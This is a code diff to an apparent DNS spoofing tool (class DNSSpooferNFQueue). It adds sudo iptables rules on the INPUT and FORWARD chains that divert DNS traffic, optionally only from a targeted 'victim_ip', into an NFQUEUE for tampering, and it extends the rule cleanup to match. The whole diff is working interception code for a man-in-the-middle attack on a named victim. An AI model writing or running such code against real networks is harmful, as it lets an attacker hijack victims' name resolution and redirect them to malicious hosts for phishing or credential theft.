@@ -85,9 +85,15 @@ class DNSSpooferNFQueue:
                 capture_output=True, timeout=2
             )
             
-            # Add rule to redirect DNS traffic to our queue
+            # Add rule to redirect DNS traffic to our queue (both INPUT and FORWARD chains)
             if self.victim_ip:
-                # Only from specific victim
+                # Only from specific victim - add to both chains
+                subprocess.run(
+                    ["sudo", "iptables", "-I", "INPUT",
+                     "-s", self.victim_ip, "-p", "udp", "--dport", "53",
+                     "-j", "NFQUEUE", "--queue-num", str(self.queue_num)],
+                    capture_output=True, timeout=5, text=True
+                )
                 cmd = [
                     "sudo", "iptables", "-I", "FORWARD",
                     "-s", self.victim_ip,
@@ -95,7 +101,13 @@ class DNSSpooferNFQueue:
                     "-j", "NFQUEUE", "--queue-num", str(self.queue_num)
                 ]
             else:
-                # From all sources
+                # From all sources - both chains
+                subprocess.run(
+                    ["sudo", "iptables", "-I", "INPUT",
+                     "-p", "udp", "--dport", "53",
+                     "-j", "NFQUEUE", "--queue-num", str(self.queue_num)],
+                    capture_output=True, timeout=5, text=True
+                )
                 cmd = [
                     "sudo", "iptables", "-I", "FORWARD",
                     "-p", "udp", "--dport", "53",
@@ -116,11 +128,17 @@ class DNSSpooferNFQueue:
             return False
     
     def _cleanup_iptables(self):
-        """Remove iptables rules"""
+        """Remove iptables rules from both chains"""
         if not self.iptables_rule_added:
             return
         
         try:
+            # Remove from INPUT chain
+            subprocess.run(
+                ["sudo", "iptables", "-D", "INPUT", "-j", "NFQUEUE", "--queue-num", str(self.queue_num)],
+                capture_output=True, timeout=5
+            )
+            # Remove from FORWARD chain
             subprocess.run(
                 ["sudo", "iptables", "-D", "FORWARD", "-j", "NFQUEUE", "--queue-num", str(self.queue_num)],
                 capture_output=True, timeout=5
